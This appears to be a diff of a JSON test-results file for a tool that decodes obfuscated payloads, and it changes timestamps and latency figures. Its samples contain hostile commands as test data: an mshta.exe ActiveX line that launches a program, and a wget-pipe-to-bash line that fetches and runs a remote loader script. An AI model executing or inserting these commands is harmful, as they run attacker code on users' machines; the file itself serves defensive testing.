@@ -1,5 +1,5 @@
 {
-  "generated_at": "2026-07-18T18:38:41Z",
+  "generated_at": "2026-07-19T04:38:11Z",
   "total": 12,
   "passed": 12,
   "pass_rate": 1.0,
@@ -71,7 +71,7 @@
       "engine": "?",
       "chain_len": 2,
       "downgrades": 0,
-      "http_ms": 4,
+      "http_ms": 0,
       "decoded_output": "mshta.exe javascript:a=new ActiveXObject(\"Wscript.Shell\");a.Run(\"calc.exe\");close();",
       "output_first_line": "mshta.exe javascript:a=new ActiveXObject(\"Wscript.Shell\");a.Run(\"calc.exe\");close();",
       "layers": [
@@ -275,8 +275,8 @@
     {
       "sample_id": "S08_wget_b64_gzip",
       "wrap": "b64(gzip(P))",
-      "encoded_input": "H4sIADHIW2oC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
-      "encoded_input_preview": "H4sIADHIW2oC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
+      "encoded_input": "H4sIALNUXGoC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
+      "encoded_input_preview": "H4sIALNUXGoC/ytPTy1R0C3011XIKCkpsNLXN7S00DM11DM0MNAzMdLPyU9MSS3SK85QqFFISizOAAAJAeOYLwAAAA==",
       "input_len": 92,
       "expected_plaintext": "wget -qO- http://198.51.100.42/loader.sh | bash",
       "expect_token": "wget",
@@ -284,7 +284,7 @@
       "engine": "?",
       "chain_len": 1,
       "downgrades": 0,
-      "http_ms": 3,
+      "http_ms": 0,
       "decoded_output": "wget -qO- http://198.51.100.42/loader.sh | bash",
       "output_first_line": "wget -qO- http://198.51.100.42/loader.sh | bash",
       "layers": [
